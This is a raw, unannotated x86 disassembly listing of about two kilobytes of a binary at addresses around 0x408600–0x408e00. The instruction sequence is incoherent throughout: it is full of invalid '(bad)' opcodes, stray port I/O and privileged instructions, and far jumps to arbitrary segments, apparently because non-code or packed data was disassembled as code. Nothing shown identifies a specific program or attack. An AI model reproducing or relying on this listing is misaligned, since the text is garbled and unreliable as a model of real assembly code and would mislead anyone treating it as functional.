  40861d:	push   esp
  40861e:	push   ebx
  40861f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408620:	rol    DWORD PTR [eax],1
  408622:	aaa    
  408623:	push   edi
  408624:	enter  0x4104,0x3
  408628:	outs   dx,BYTE PTR ds:[esi]
  408629:	imul   ebp,DWORD PTR [ecx+eiz*1+0x0],0xb1088130
  408631:	nop
  408632:	pop    ss
  408633:	enter  0x991,0x96
  408637:	cld    
  408638:	mov    ecx,0xe0585fa
  40863d:	mov    WORD PTR [eax],sp
  408640:	cmp    eax,0x2cafc719
  408645:	nop
  408646:	pusha  
  408647:	fwait
  408648:	outs   dx,BYTE PTR ds:[esi]
  408649:	mov    si,0x1c18
  40864d:	and    ebp,DWORD PTR [eax+ecx*2+0x1ded601b]
  408654:	adc    BYTE PTR [esi],0xfe
  408657:	inc    ebx
  408658:	stos   DWORD PTR es:[edi],eax
  408659:	xchg   DWORD PTR [ecx-0xf0de9bb],ecx
  40865f:	push   es
  408660:	sar    DWORD PTR [esi+0x37ffa69c],0x78
  408667:	xor    eax,0x95b50430
  40866c:	xchg   edx,eax
  40866d:	inc    edi
  40866e:	jne    0x4085fc
  408670:	add    eax,0x2b015ad
  408675:	pusha  
  408676:	dec    edi
  408677:	fiadd  WORD PTR [ebp+0x4b]
  40867a:	mov    ch,0x8a
  40867c:	lahf   
  40867d:	and    DWORD PTR [edx],ebx
  40867f:	clc    
  408680:	mov    ds:0x4e4242ec,eax
  408685:	repz rcl BYTE PTR [edi+0xed53408],1
  40868c:	fst    DWORD PTR [eax-0x78f632a8]
  408692:	adc    ah,bl
  408694:	dec    edi
  408695:	pusha  
  408696:	sbb    BYTE PTR [edi],cl
  408698:	jmp    0x408717
  40869a:	ss icebp 
  40869c:	xchg   eax,ebx
  40869e:	arpl   WORD PTR [eax],di
  4086a0:	push   esi
  4086a1:	iret   
  4086a2:	xchg   esi,eax
  4086a3:	mov    al,0x7c
  4086a5:	rcl    BYTE PTR [ebx+0x129d24c2],0xe
  4086ac:	imul   eax,DWORD PTR [edi-0x482212b0],0x64
  4086b3:	mov    ds:0xec06c34b,eax
  4086b8:	imul   DWORD PTR [eax+0x2b]
  4086bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086bc:	xor    eax,0xf825d980
  4086c1:	icebp  
  4086c2:	lock cmp ah,0x5d
  4086c6:	sbb    bh,al
  4086c8:	sub    eax,0x5db3346
  4086cd:	sub    al,0x38
  4086cf:	call   DWORD PTR [edi+0xc]
  4086d2:	jle    0x4086b6
  4086d4:	lea    eax,[eax]
  4086d6:	jle    0x4086f3
  4086d8:	add    ecx,eax
  4086da:	in     al,0x11
  4086dc:	jge    0x4086d5
  4086de:	mov    BYTE PTR [edx+0x31],bl
  4086e1:	cmp    al,0x43
  4086e3:	dec    esi
  4086e4:	jne    0x4086bc
  4086e6:	aad    0xad
  4086e8:	push   es
  4086e9:	loope  0x40873b
  4086eb:	sub    eax,0x6d24f81c
  4086f0:	retf   0x1a06
  4086f3:	adc    eax,0xf47bd256
  4086f8:	out    0x43,eax
  4086fa:	jle    0x408704
  4086fc:	js     0x4086b7
  4086fe:	pusha  
  4086ff:	test   al,0xf6
  408701:	retf   0x724
  408704:	sub    BYTE PTR [ebx+0x63],0x54
  408708:	pop    es
  408709:	cld    
  40870a:	imul   edx,DWORD PTR [edi+0x28],0xf38b44f1
  408711:	mov    ch,BYTE PTR [esi+0x4428896]
  408717:	adc    BYTE PTR [edi],al
  408719:	pop    ebx
  40871a:	call   0x506:0x607734b
  408721:	or     dh,dl
  408723:	or     BYTE PTR [esi],cl
  408725:	pop    esp
  408726:	(bad)  
  408727:	pop    edi
  408728:	js     0x40876a
  40872a:	pop    ebx
  40872b:	gs pop es
  40872d:	sbb    ch,BYTE PTR [edi+0x55c7520c]
  408733:	cld    
  408734:	sub    cl,dh
  408736:	xchg   BYTE PTR [ecx+0x5074389f],dh
  40873c:	popa   
  40873d:	or     BYTE PTR [eax+0x53],ah
  408740:	xor    BYTE PTR [ebx+edx*2-0x203c677f],bh
  408747:	push   esi
  408748:	mov    eax,ds:0xee822670
  40874d:	dec    esi
  40874e:	mov    bh,0x2d
  408750:	mov    bl,0x1
  408752:	sbb    eax,0xd92777c6
  408757:	mov    bh,0xee
  408759:	jmp    0x408782
  40875b:	(bad)  
  40875c:	dec    edi
  40875d:	clc    
  40875e:	sar    DWORD PTR [eax],1
  408760:	pushf  
  408761:	xor    bl,0x1
  408764:	jmp    0x408776
  408766:	and    esi,DWORD PTR [esi+ecx*1+0x5ce30f00]
  40876d:	lahf   
  40876e:	mov    dl,0xc3
  408770:	xor    DWORD PTR [esi],eax
  408772:	push   0xd
  408774:	adc    BYTE PTR [edi-0x2c],0x3f
  408778:	inc    eax
  408779:	or     dh,dh
  40877b:	xor    eax,0x76946850
  408780:	sub    ah,dl
  408782:	daa    
  408783:	stos   BYTE PTR es:[edi],al
  408784:	adc    DWORD PTR [esp+ebx*4+0x55],eax
  408788:	adc    DWORD PTR [eax-0x7c7a9fa7],eax
  40878e:	sub    eax,DWORD PTR [eax]
  408790:	mov    edx,0xc97b0820
  408795:	lea    ecx,[eax+0x70]
  408798:	sbb    cl,0x8f
  40879b:	aam    0x13
  40879d:	pop    ebx
  40879e:	inc    edx
  40879f:	adc    DWORD PTR [esi],ebx
  4087a1:	dec    eax
  4087a2:	or     ch,ch
  4087a4:	pop    es
  4087a5:	dec    esi
  4087a6:	mov    es,ebx
  4087a8:	pusha  
  4087a9:	add    dh,BYTE PTR [ebx+0x3f]
  4087ac:	in     al,dx
  4087ad:	lock and eax,ecx
  4087b0:	dec    ecx
  4087b1:	cmp    al,BYTE PTR [esp+ebp*8-0x2f]
  4087b5:	or     BYTE PTR [esi-0x78fb872c],cl
  4087bb:	cld    
  4087bc:	push   DWORD PTR ds:0x1f0c3d2e
  4087c2:	cmp    ebx,eax
  4087c4:	jne    0x408801
  4087c6:	fdivr  DWORD PTR ds:0x3a4bf030
  4087cc:	sahf   
  4087cd:	push   esp
  4087ce:	cld    
  4087cf:	lock push eax
  4087d1:	pop    esi
  4087d2:	in     al,dx
  4087d3:	loopne 0x408852
  4087d5:	fsub   st(1),st
  4087d7:	push   ebp
  4087d8:	in     al,dx
  4087d9:	pop    eax
  4087da:	jns    0x40876c
  4087dc:	jne    0x4087e6
  4087de:	inc    edx
  4087df:	shl    DWORD PTR [eax+0x43cdc801],cl
  4087e5:	imul   ebx,DWORD PTR [ebx],0xec4108d8
  4087eb:	mov    edx,0x18422f02
  4087f0:	inc    esi
  4087f1:	out    dx,al
  4087f2:	addr16 clc 
  4087f4:	loopne 0x408858
  4087f6:	test   BYTE PTR [eax+eiz*1],bl
  4087f9:	pop    eax
  4087fa:	mov    ecx,0xe17221e4
  4087ff:	ins    BYTE PTR es:[edi],dx
  408800:	push   0x551ec609
  408805:	div    DWORD PTR [eax+eax*4]
  408808:	ret    
  408809:	mov    bh,0xe4
  40880b:	lds    ebp,FWORD PTR [edi+0x9]
  40880e:	xor    eax,0x5940380a
  408813:	scas   eax,DWORD PTR es:[edi]
  408814:	push   es
  408815:	in     eax,dx
  408816:	add    DWORD PTR [ecx-0xbfb0f99],eax
  40881c:	aaa    
  40881d:	mov    cl,0x1
  40881f:	in     al,0x4d
  408821:	mov    edi,0x2b2e0a50
  408826:	cmp    al,0xbd
  408828:	in     eax,0xa6
  40882a:	fwait
  40882b:	cld    
  40882c:	adc    edx,DWORD PTR [ebx+0x5874861a]
  408832:	enter  0xd691,0xab
  408836:	scas   al,BYTE PTR es:[edi]
  408837:	fisub  WORD PTR [esi-0x1ed2df14]
  40883d:	sub    edx,ebp
  40883f:	jmp    0x19d6:0x92f6e690
  408846:	and    al,bh
  408848:	and    al,0x1d
  40884a:	pop    esi
  40884b:	and    DWORD PTR [edi+0x570a350f],ecx
  408851:	or     bh,ch
  408853:	lock pop eax
  408855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408856:	and    DWORD PTR ds:0x7867dbf7,esp
  40885c:	pop    eax
  40885d:	and    BYTE PTR [edi-0x69],ch
  408860:	mov    esi,DWORD PTR [ecx-0x599ed6f6]
  408866:	and    eax,0x6e5a1c1b
  40886b:	out    dx,al
  40886c:	pop    ebx
  40886d:	stc    
  40886e:	or     BYTE PTR [esp+eiz*8+0x4d],ah
  408872:	retf   
  408873:	mov    eax,0x83a9020a
  408878:	jns    0x408871
  40887a:	inc    ebp
  40887b:	retf   
  40887c:	xor    eax,0xde010b4
  408881:	push   0xffffffe8
  408883:	mov    ds:0xc30bcb3a,al
  408888:	adc    al,0xa
  40888a:	and    ch,BYTE PTR [esi+edx*1]
  40888d:	push   ds
  40888e:	ficomp WORD PTR [edx-0x1c]
  408891:	or     edi,DWORD PTR [ebx]
  408893:	push   es
  408894:	or     DWORD PTR [edi],ebx
  408896:	loopne 0x40890d
  408898:	dec    ebp
  408899:	xor    al,BYTE PTR [esi+0x22]
  40889c:	xor    al,0x22
  40889e:	int3   
  40889f:	pop    ecx
  4088a0:	jns    0x40882e
  4088a2:	loopne 0x40887d
  4088a4:	inc    esi
  4088a5:	adc    BYTE PTR [edi+0x1b],al
  4088a8:	loopne 0x408913
  4088aa:	push   0xff600d1a
  4088af:	adc    eax,DWORD PTR [ebx]
  4088b1:	clc    
  4088b2:	add    ebx,edi
  4088b4:	call   DWORD PTR [esi+edx*2+0x41]
  4088b8:	retf   
  4088b9:	data16 test BYTE PTR [ecx-0x67d292ed],dh
  4088c0:	mov    bl,0xec
  4088c2:	sbb    eax,0x9bdc9326
  4088c7:	pop    eax
  4088c8:	call   0x80445a77
  4088cd:	in     eax,0x9a
  4088cf:	call   0x53fe3941
  4088d4:	push   eax
  4088d5:	mov    eax,0x5d01fd20
  4088da:	sbb    ah,ah
  4088dc:	or     al,0x5f
  4088de:	xchg   edx,eax
  4088df:	mov    eax,ds:0xb0e7e43b
  4088e4:	cmc    
  4088e5:	pusha  
  4088e6:	sbb    DWORD PTR [ecx+edi*2-0x2e],0x3bae00b
  4088ee:	inc    ebp
  4088ef:	add    DWORD PTR [ecx+ecx*2+0x5f],0x89986397
  4088f7:	sar    ah,0x3f
  4088fa:	or     al,0x41
  4088fc:	and    eax,DWORD PTR [edi]
  4088fe:	push   ebx
  4088ff:	add    ebx,0xf87c2c67
  408905:	hlt    
  408906:	fld    TBYTE PTR [edx]
  408908:	inc    edi
  408909:	inc    eax
  40890a:	xchg   DWORD PTR [ecx],edx
  40890c:	sbb    BYTE PTR [ebp-0x4],cl
  40890f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408910:	mov    al,ds:0x342309
  408915:	or     eax,0xa1c9f824
  40891a:	cmp    BYTE PTR [ebx+0x39d354dc],0x67
  408921:	or     al,0xc6
  408923:	sub    dh,BYTE PTR [eax+0x18]
  408926:	cmp    al,0x3f
  408928:	push   edi
  408929:	loopne 0x4089a0
  40892b:	pushf  
  40892c:	push   edi
  40892d:	call   0x577aa9f
  408932:	arpl   WORD PTR [ebx-0x2fb7f270],di
  408938:	jl     0x4089a1
  40893a:	and    esp,ecx
  40893c:	mov    eax,ds:0x30238e60
  408941:	call   DWORD PTR [esi+0x11]
  408944:	sbb    BYTE PTR [eax],bh
  408946:	mov    ds:0xd0020170,al
  40894b:	test   al,0xec
  40894d:	fwait
  40894e:	lods   eax,DWORD PTR ds:[esi]
  40894f:	sbb    DWORD PTR [ebp+0x2b],0x9d9a4a0e
  408956:	call   0x2a4150df
  40895b:	and    eax,0x29ce8b06
  408960:	clc    
  408961:	and    BYTE PTR [edi],dl
  408963:	(bad)
  408967:	mov    gs,eax
  408969:	sub    DWORD PTR [esi+eax*1+0xf8f8417],ebx
  408970:	sbb    BYTE PTR [eax*1-0x5b8afff5],cl
  408977:	xchg   ebx,eax
  408978:	sbb    BYTE PTR ds:[ecx],dl
  40897b:	inc    esp
  40897c:	sbb    bl,BYTE PTR [edx]
  40897e:	(bad)  
  40897f:	jmp    FWORD PTR [ebp+0x73838897]
  408985:	jecxz  0x408932
  408987:	out    dx,eax
  408988:	mov    cl,0x8c
  40898a:	test   DWORD PTR [edx-0x2d],ebx
  40898d:	mov    eax,0x4f74ef19
  408992:	adc    al,0xd6
  408994:	and    al,0xef
  408996:	cmp    ebp,eax
  408998:	je     0x4089a1
  40899a:	and    DWORD PTR [edx-0x1f],0x83efa862
  4089a1:	into   
  4089a2:	xchg   esp,eax
  4089a3:	pop    ebp
  4089a4:	push   esi
  4089a5:	loope  0x4089f9
  4089a7:	mov    cl,0x37
  4089a9:	or     al,0x4b
  4089ab:	shl    DWORD PTR [edx],1
  4089ad:	or     eax,0x240816d2
  4089b2:	adc    edx,edi
  4089b4:	mov    ebp,0x66c290e1
  4089b9:	push   0x34
  4089bb:	retf   0xd8a1
  4089be:	stc    
  4089bf:	loope  0x408963
  4089c1:	pop    es
  4089c2:	inc    ebx
  4089c3:	ret    0xcfa
  4089c6:	cmp    bh,dl
  4089c8:	hlt    
  4089c9:	or     BYTE PTR [edx],bh
  4089cb:	add    esp,DWORD PTR [ebx+esi*2-0x6c9318d1]
  4089d2:	mov    WORD PTR [eax-0x5a0418e7],ds
  4089d8:	rcl    BYTE PTR [ebx+0x29],0xc6
  4089dc:	imul   ebp,DWORD PTR [eax],0x90061787
  4089e2:	inc    edi
  4089e3:	cmp    al,0x3
  4089e6:	popf   
  4089e7:	push   cs
  4089e8:	cmp    bh,0xe1
  4089eb:	xchg   ecx,eax
  4089ec:	shr    BYTE PTR [ebx],cl
  4089ee:	inc    ebp
  4089ef:	lock dec DWORD PTR [ecx]
  4089f2:	cmp    BYTE PTR [ebx],ch
  4089f4:	lock lea ebp,[edi]
  4089f7:	fsub   QWORD PTR [eax]
  4089f9:	dec    edi
  4089fa:	adc    al,0xce
  4089fc:	push   ebp
  4089fd:	push   ss
  4089fe:	xchg   edi,eax
  4089ff:	jns    0x408a5d
  408a01:	ja     0x4089e0
  408a03:	or     al,0x16
  408a05:	out    dx,eax
  408a06:	sub    al,0xa3
  408a08:	xchg   DWORD PTR [esi],ecx
  408a0a:	inc    edx
  408a0b:	cs hlt 
  408a0d:	or     ah,BYTE PTR [esi+ecx*1+0x2056f8d0]
  408a14:	popa   
  408a15:	aad    0xd7
  408a17:	pop    ss
  408a18:	add    DWORD PTR [ebp+0x4e],ecx
  408a1b:	add    esp,DWORD PTR [ecx+0x4d]
  408a1e:	nop    edx
  408a21:	sbb    dl,BYTE PTR [eax-0x10]
  408a24:	imul   esi,DWORD PTR fs:[eax],0x61c0f80f
  408a2b:	mov    edx,DWORD PTR [ebp+0x57481762]
  408a31:	test   DWORD PTR [edx+eax*4],edi
  408a34:	imul   eax,DWORD PTR [ebx],0x64
  408a37:	pop    edi
  408a38:	aaa    
  408a39:	pavgw  mm1,QWORD PTR [edx+0x29]
  408a3d:	jns    0x408a93
  408a3f:	psllq  mm5,QWORD PTR [esi]
  408a42:	jle    0x408a84
  408a44:	call   0xde9d:0xf09b5127
  408a4b:	xor    al,0xe
  408a4d:	sti    
  408a4e:	loope  0x408a38
  408a50:	adc    eax,0x231b5548
  408a55:	test   DWORD PTR ds:[edi+0x1a],esi
  408a59:	(bad)  
  408a5b:	out    dx,eax
  408a5c:	and    ecx,DWORD PTR [esi-0x74]
  408a5f:	sbb    cl,ch
  408a61:	cmp    BYTE PTR [eax],dl
  408a63:	mov    ebp,0x487c42bc
  408a68:	jmp    0x2f10:0x13952810
  408a6f:	mov    eax,ds:0xef5a8581
  408a74:	pop    ecx
  408a75:	bound  eax,QWORD PTR [ecx]
  408a77:	ds push ebp
  408a79:	je     0x408a80
  408a7b:	aad    0x79
  408a7d:	add    al,0x5d
  408a7f:	clc    
  408a80:	and    eax,0xdea07c0f
  408a85:	lds    ebx,FWORD PTR [edx]
  408a87:	adc    dl,dh
  408a89:	test   al,0x6e
  408a8b:	sub    DWORD PTR [edi+0x30],esi
  408a8e:	scas   eax,DWORD PTR es:[edi]
  408a8f:	aas    
  408a90:	adc    BYTE PTR [eax-0x8a97375],al
  408a96:	das    
  408a97:	push   0x3a203c9
  408a9c:	mov    al,0x35
  408a9e:	(bad)  
  408a9f:	adc    BYTE PTR [eax+edx*4],ah
  408aa2:	xchg   DWORD PTR [eax+edi*2],ebx
  408aa5:	xchg   esi,eax
  408aa6:	adc    al,dh
  408aa8:	cmp    ah,BYTE PTR [ecx+0x5c]
  408aab:	fbstp  TBYTE PTR [edi+0x212d10e9]
  408ab1:	sub    al,0x38
  408ab3:	mov    al,gs:0xefa5c390
  408ab9:	mov    bl,0xe8
  408abb:	or     edi,DWORD PTR [ecx+ebp*2]
  408abe:	lock adc cl,dh
  408ac1:	push   ds
  408ac2:	add    al,0x25
  408ac4:	pop    ss
  408ac5:	mov    ch,0x5
  408ac7:	sbb    DWORD PTR [esp+ebp*1],ecx
  408aca:	and    al,0x7a
  408acc:	nop
  408acd:	(bad)  
  408ace:	fndisi(8087 only) 
  408ad0:	adc    BYTE PTR [ebp+0x10],ch
  408ad3:	lea    ecx,[esi]
  408ad5:	(bad)  
  408ad6:	mov    eax,0x33ee001b
  408adb:	das    
  408adc:	sub    ah,BYTE PTR [edx]
  408ade:	aam    0xbc
  408ae0:	or     BYTE PTR [edx+0x59],dl
  408ae3:	jg     0x408b0c
  408ae5:	jae    0x408af8
  408ae7:	push   cs
  408ae8:	and    BYTE PTR [edi+eax*4],dh
  408aeb:	inc    ebp
  408aec:	(bad)  
  408aed:	cmp    esp,DWORD PTR [eax]
  408aef:	js     0x408b36
  408af1:	or     edi,DWORD PTR [ebx]
  408af3:	in     eax,0x7a
  408af5:	adc    DWORD PTR [ebx],edx
  408af7:	pushf  
  408af8:	cwde   
  408af9:	ret    0xffb4
  408afc:	std    
  408afd:	xor    al,0x12
  408aff:	xchg   ebx,eax
  408b00:	mov    ebx,0x17ce9185
  408b05:	adc    al,BYTE PTR [ecx-0x80]
  408b08:	fld    QWORD PTR [ecx+0x404cc715]
  408b0e:	jmp    0x408b49
  408b10:	fdiv   st,st(6)
  408b12:	stos   DWORD PTR es:[edi],eax
  408b13:	mov    ah,0x82
  408b15:	scas   al,BYTE PTR es:[edi]
  408b16:	mov    dl,BYTE PTR [ebx]
  408b18:	jbe    0x408b24
  408b1a:	sub    dl,0xa
  408b1d:	je     0x408b24
  408b1f:	or     BYTE PTR [ebx],al
  408b21:	jno    0x408b44
  408b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b24:	add    esp,DWORD PTR [eax]
  408b26:	retf   
  408b27:	sub    ecx,eax
  408b29:	int3   
  408b2a:	fldcw  WORD PTR [edi+0x23925518]
  408b30:	std    
  408b31:	cmp    BYTE PTR [ebx],0xd
  408b34:	jne    0x408b90
  408b36:	nop
  408b37:	inc    edi
  408b38:	hlt    
  408b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b3a:	or     cl,BYTE PTR [edx]
  408b3c:	add    BYTE PTR [ebp-0x3e],dh
  408b3f:	int    0x1e
  408b41:	adc    ah,bl
  408b43:	sub    BYTE PTR ds:0xc9123baf,ah
  408b49:	pushf  
  408b4a:	mov    BYTE PTR [esi+0x71],bl
  408b4d:	dec    edi
  408b4e:	mov    edx,0xb4156512
  408b53:	add    eax,0x3de034cc
  408b58:	pop    ds
  408b59:	pushf  
  408b5a:	jo     0x408ae4
  408b5c:	inc    esi
  408b5d:	mov    BYTE PTR [ebx+0x63],ah
  408b60:	push   ss
  408b61:	pop    esp
  408b62:	sbb    al,0x6a
  408b64:	fcomp  QWORD PTR [edx]
  408b66:	push   edx
  408b67:	in     al,0x6b
  408b69:	mov    esp,0x7112c1ed
  408b6e:	sub    DWORD PTR cs:[ebp+edi*1-0x7e0083a4],eax
  408b76:	out    0x9f,al
  408b78:	iret   
  408b79:	test   BYTE PTR [ebx+0x4],0x4
  408b7d:	cmp    eax,0x438ae841
  408b82:	pop    es
  408b83:	jle    0x408b84
  408b85:	jo     0x408bc9
  408b87:	aaa    
  408b88:	cmp    bl,BYTE PTR [esi+0x7]
  408b8b:	jne    0x408b93
  408b8d:	test   BYTE PTR [esi+0x3e],0x7
  408b91:	or     BYTE PTR [esi+0x38],0x18
  408b95:	fs (bad) 
  408b97:	or     cl,BYTE PTR [eax-0x3f387de4]
  408b9d:	xor    eax,0x1603135d
  408ba2:	add    al,0x24
  408ba4:	movaps xmm5,XMMWORD PTR [ecx+ecx*8]
  408ba8:	stos   BYTE PTR es:[edi],al
  408ba9:	cmp    BYTE PTR [esi],al
  408bab:	aad    0xf5
  408bad:	mov    dh,0x46
  408baf:	adc    al,0xa
  408bb1:	in     al,dx
  408bb2:	jecxz  0x408be4
  408bb4:	adc    ah,bl
  408bb6:	inc    esi
  408bb7:	or     BYTE PTR [esi-0x1d6ecb09],bl
  408bbd:	in     eax,dx
  408bbe:	sub    edx,DWORD PTR [esp+edx*1+0x46]
  408bc2:	mov    ch,0x28
  408bc4:	aam    0xca
  408bc6:	adc    BYTE PTR [edx],ch
  408bc8:	pop    ds
  408bc9:	cs ret 
  408bcb:	cmp    al,0x60
  408bcd:	dec    edx
  408bce:	adc    DWORD PTR [ebx],ebp
  408bd0:	aaa    
  408bd1:	icebp  
  408bd2:	add    BYTE PTR [eax-0x20],0x63
  408bd6:	or     DWORD PTR [edx],edx
  408bd8:	lock adc al,0x29
  408bdb:	or     al,0x11
  408bdd:	icebp  
  408bde:	push   ss
  408bdf:	sub    edx,DWORD PTR cs:[ebp-0x42a3eaf7]
  408be6:	mov    WORD PTR [edx],?
  408be8:	sbb    al,0x68
  408bea:	sbb    eax,0x54256a54
  408bef:	mov    ds:0xeb029e26,al
  408bf4:	div    al
  408bf6:	loop   0x408c1f
  408bf8:	dec    esi
  408bf9:	sub    eax,0xf9c8909a
  408bfe:	sbb    al,0x1
  408c00:	inc    ebx
  408c01:	adc    DWORD PTR [edi],esp
  408c03:	fs mov esi,0xf1963810
  408c09:	retf   0x8893
  408c0c:	fwait
  408c0d:	push   0x3f
  408c0f:	adc    BYTE PTR [ecx],0xd7
  408c12:	inc    ecx
  408c13:	data16 or al,0x22
  408c16:	pop    edx
  408c17:	push   ebx
  408c18:	mov    esi,DWORD PTR [eax]
  408c1a:	add    DWORD PTR [eax+ecx*8+0x24],0xfffffffe
  408c1f:	and    BYTE PTR [edi+eax*4],dh
  408c22:	sbb    al,0x5b
  408c24:	aaa    
  408c25:	sub    ch,BYTE PTR [eax+ebp*1]
  408c28:	pop    ebx
  408c29:	mov    al,ds:0x1419b4e9
  408c2e:	xor    edi,DWORD PTR [ebp+0x16088492]
  408c34:	shl    BYTE PTR [eax-0x53],cl
  408c37:	cmp    al,0x4b
  408c39:	adc    al,0xd3
  408c3b:	popf   
  408c3c:	fst    DWORD PTR [edx-0x67]
  408c3f:	inc    ebx
  408c40:	ret    
  408c41:	push   ecx
  408c42:	and    BYTE PTR [eax],0xc9
  408c45:	push   esp
  408c46:	jmp    0x408cc7
  408c48:	pop    ss
  408c49:	adc    al,0xfb
  408c4b:	nop
  408c4c:	setbe  BYTE PTR [ebp-0x57]
  408c50:	lea    eax,[eax+esi*8]
  408c53:	ss jo  0x408c55
  408c56:	(bad)  
  408c57:	in     eax,dx
  408c58:	mov    es,WORD PTR [eax]
  408c5a:	mov    al,0xaa
  408c5c:	adc    eax,0xf0144303
  408c61:	add    eax,0xbdc476b
  408c66:	inc    esp
  408c67:	lock or BYTE PTR [eax],al
  408c6a:	rol    edi,cl
  408c6c:	add    DWORD PTR [ebx],0x6d
  408c6f:	lea    esp,[ebx*8+0x230cff85]
  408c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c77:	fs xchg edx,eax
  408c79:	jnp    0x408c4a
  408c7b:	in     eax,0x95
  408c7d:	mov    BYTE PTR [edi+esi*1],ah
  408c80:	mov    edx,0x3f100501
  408c85:	push   eax
  408c86:	or     al,0xaa
  408c88:	out    dx,al
  408c89:	pop    eax
  408c8a:	cld    
  408c8b:	lock inc eax
  408c8d:	dec    esp
  408c8e:	shr    BYTE PTR [ebp+0x486e009d],1
  408c94:	sbb    BYTE PTR [ecx+0x44a341a],cl
  408c9a:	and    ecx,esp
  408c9c:	arpl   bx,bx
  408c9e:	or     BYTE PTR [ecx+0x448045a],cl
  408ca4:	pop    edi
  408ca5:	cmp    al,0x6d
  408ca7:	sub    BYTE PTR [eax-0x69],dh
  408caa:	or     BYTE PTR [ebp-0x70],0xae
  408cae:	xor    BYTE PTR [edi],0x99
  408cb1:	fiadd  DWORD PTR [edi+0x14]
  408cb4:	dec    eax
  408cb5:	mov    bl,0xb7
  408cb7:	mov    bh,0xc7
  408cb9:	sub    BYTE PTR [ebx],bh
  408cbb:	je     0x408cc3
  408cbd:	jg     0x408cfe
  408cbf:	mov    ebx,DWORD PTR [edx+ecx*1+0x3]
  408cc3:	(bad)  
  408cc5:	jmp    0x408cf1
  408cc7:	ret    0xd117
  408cca:	add    DWORD PTR [ebx+0x14],eax
  408ccd:	aam    0x12
  408ccf:	(bad)  
  408cd0:	in     al,dx
  408cd1:	cs dec eax
  408cd3:	fild   WORD PTR [ebp-0x72fa821a]
  408cd9:	jae    0x408cdc
  408cdb:	ds aad 0x35
  408cde:	dec    ecx
  408cdf:	not    bl
  408ce1:	dec    edx
  408ce2:	mov    DWORD PTR [esi+eax*2-0x1e],edx
  408ce6:	or     eax,0x88ae0181
  408ceb:	inc    esp
  408cec:	add    esp,DWORD PTR [ecx+eax*1+0x4c]
  408cf0:	repz jge 0x408c77
  408cf3:	mov    ebx,0xc17e8d81
  408cf8:	mov    DWORD PTR [eax],esi
  408cfa:	mov    dh,BYTE PTR [eax]
  408cfc:	push   eax
  408cfd:	shl    DWORD PTR [ecx+0x37],0xcb
  408d01:	(bad)  
  408d02:	out    dx,eax
  408d03:	add    eax,ebp
  408d05:	lea    eax,[eax-0x230d25e2]
  408d0b:	sbb    cl,BYTE PTR [eax]
  408d0d:	pop    eax
  408d0e:	shl    DWORD PTR [edi+0x14400a18],1
  408d14:	ret    
  408d15:	mov    al,ds:0x3f545869
  408d1a:	fimul  DWORD PTR [ebx-0xd0643fc]
  408d20:	push   es
  408d21:	pop    eax
  408d22:	push   esi
  408d23:	mov    edx,DWORD PTR [eax+0x18]
  408d26:	repnz test esi,esi
  408d29:	mov    BYTE PTR [ebx],0xc1
  408d2c:	(bad)  
  408d2d:	pop    ds
  408d2e:	dec    ebp
  408d2f:	mov    ecx,0x9abebe9c
  408d34:	(bad)  
  408d35:	or     eax,0x8087d10c
  408d3a:	pop    esi
  408d3b:	iret   
  408d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d3d:	push   cs
  408d3e:	lea    ecx,es:[esi+0x0]
  408d42:	sub    ebx,edi
  408d44:	in     al,0xb3
  408d46:	sbb    DWORD PTR [eax],ecx
  408d48:	dec    eax
  408d49:	sbb    al,0x8d
  408d4b:	push   eax
  408d4c:	mov    bl,0xbf
  408d4e:	adc    ecx,DWORD PTR [esi]
  408d50:	icebp  
  408d51:	xor    al,0xf7
  408d53:	test   al,0x0
  408d55:	or     eax,0x223c16cd
  408d5a:	das    
  408d5b:	int    0xa1
  408d5d:	je     0x408d28
  408d5f:	add    eax,0x44fa1e4b
  408d64:	push   edi
  408d65:	test   DWORD PTR [esi-0x7a],edi
  408d68:	jns    0x408dc5
  408d6a:	sbb    BYTE PTR [ecx-0x496e7725],bl
  408d70:	adc    DWORD PTR [ecx],ebp
  408d72:	popf   
  408d73:	ja     0x408d1c
  408d75:	aas    
  408d76:	add    al,0x3f
  408d78:	(bad)  
  408d79:	add    eax,0x201843ea
  408d7e:	or     eax,0x61fee006
  408d83:	mov    ds:0x801d0910,al
  408d88:	lea    edx,[edx+esi*8+0x8]
  408d8c:	push   edx
  408d8d:	bt     DWORD PTR [edi+eax*4-0x38],eax
  408d92:	nop
  408d93:	and    eax,0x79115ac2
  408d98:	loopne 0x408dbb
  408d9a:	(bad)  [edi-0x6d21f9b5]
  408da0:	jmp    0x408d52
  408da2:	xchg   BYTE PTR [ebx-0x5f],ch
  408da5:	(bad)  
  408da7:	jl     0x408d3a
  408da9:	push   0x5a
  408dab:	adc    eax,0x5791f364
  408db0:	sub    esi,DWORD PTR ds:0xbbc1b6d8
  408db6:	xchg   DWORD PTR [eax-0x1ab3ef1e],ebx
  408dbc:	mov    DWORD PTR [eax+edi*4-0x7f],edi
  408dc0:	inc    esi
  408dc1:	call   0xa9c81f5c
  408dc6:	pop    edi
  408dc7:	loopne 0x408d51
  408dc9:	cwde   
  408dca:	jne    0x408dd0
  408dcc:	add    eax,DWORD PTR [ebp-0xc]
  408dcf:	ror    DWORD PTR [esi],1
  408dd1:	mov    ebp,0x3e38080d
  408dd6:	mov    edx,DWORD PTR [ebp+0x6cd146a7]
  408ddc:	or     BYTE PTR [edx],dl
  408dde:	and    cl,BYTE PTR [esi-0x2a]
  408de1:	mov    ebx,0x7f20d24d
  408de6:	(bad)  
  408de7:	jl     0x408e09
  408de9:	loop   0x408e32
  408deb:	mov    ebp,0x9793c6c3
  408df0:	mov    esp,0x75890575
  408df5:	in     eax,dx
  408df6:	xchg   DWORD PTR [ebp+0x3b0852b6],ecx
  408dfc:	or     BYTE PTR [ebp-0x30],dh
  408dff:	inc    ebx
  408e00:	dec    esi
  408e01:	inc    esi
  408e02:	jge    0x408e5d
  408e04:	adc    DWORD PTR es:[edi+0x7ef81ab7],esi
  408e0b:	adc    DWORD PTR [ebx-0x26],esp
  408e0e:	es jo  0x408e44
  408e11:	fwait
  408e12:	pop    ebx
  408e13:	pop    es
  408e14:	jmp    0x7f85:0x7cf460e4
  408e1b:	add    dl,BYTE PTR [edx]
